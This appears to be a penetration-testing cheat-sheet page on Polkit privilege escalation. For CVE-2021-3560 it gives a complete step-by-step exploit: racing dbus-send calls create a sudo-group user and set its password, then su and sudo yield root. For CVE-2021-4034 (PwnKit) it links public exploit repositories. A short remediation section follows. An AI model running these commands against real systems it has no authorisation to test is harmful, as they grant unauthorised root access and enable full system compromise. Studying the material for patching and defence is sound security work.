# PolKit Privilege Escalation

Polkit (PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems.\
It provides an organized way for non-privileged processes to communicate with privileged ones.

### CVE-2021-3560 <a href="#cve-2021-3560" id="cve-2021-3560"></a>

#### 1. Send a dbus message to create a new user <a href="#id-1-send-a-dbus-message-to-create-a-new-user" id="id-1-send-a-dbus-message-to-create-a-new-user"></a>

Create a new user by sending a dbus message.

```shellscript
# string:tester: The new user named "tester".
# string:"Tester Account": The description of the new user.
# int32:1: sudo group
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:"Tester Account" int32:1 & sleep 0.005s; kill $!
```

Then check the new user ID (uid).

```shellscript
id tester

uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo)
```

#### 2. Generate a new password hash <a href="#id-2-generate-a-new-password-hash" id="id-2-generate-a-new-password-hash"></a>

```shellscript
# -6: SHA512
openssl passwd -6 password123
```

Copy the output hash.

#### 3. Send a dbus message to set a new password <a href="#id-3-send-a-dbus-message-to-set-a-new-password" id="id-3-send-a-dbus-message-to-set-a-new-password"></a>

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'<password_hash>' string:'Ask the tester' & sleep 0.005s; kill $!
```

#### 4. Switch the new user <a href="#id-4-switch-the-new-user" id="id-4-switch-the-new-user"></a>

```
su tester
```

Enter the password you created e.g. “password123”.\
Now change to root .

```
sudo -s
# or
sudo su root
```

### CVE-2021-4034 (PwnKit) <a href="#cve-2021-4034-pwnkit" id="cve-2021-4034-pwnkit"></a>

PwnKit is vulnerability of Polkit to local privilege escalation.\
There are many exploits available. Below are examples:

* [https://github.com/arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)
* [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)
* [https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)
* [https://github.com/Almorabea/pkexec-exploit](https://github.com/Almorabea/pkexec-exploit) (this is written by Python)

### Remediations <a href="#remediations" id="remediations"></a>

To avoid the vulnerability, unset setuid from the pkexec executable.

```
sudo chmod 0755 /usr/bin/pkexec
# or
sudo chmod 0755 `which pkexec`
```

Or simply upgrade the apt packages in most of distributions which are patched for the vulnerability.

```
sudo apt update && sudo apt upgrade
```

### References <a href="#references" id="references"></a>

* [Qualys](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
